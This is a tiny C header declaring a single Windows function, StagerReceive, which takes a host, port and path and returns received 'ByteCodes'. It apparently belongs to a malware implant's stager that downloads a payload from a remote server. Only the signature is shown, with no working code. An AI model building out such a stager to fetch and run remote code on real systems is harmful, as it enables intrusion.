#pragma once

#include <windows.h>
#include <core/win32.h>

void StagerReceive(INSTANCE pInstance, _In_ LPWSTR Host, _In_ int Port, _In_ LPWSTR Path, _Out_ PBYTE *ByteCodes, _Out_ DWORD *ByteSize);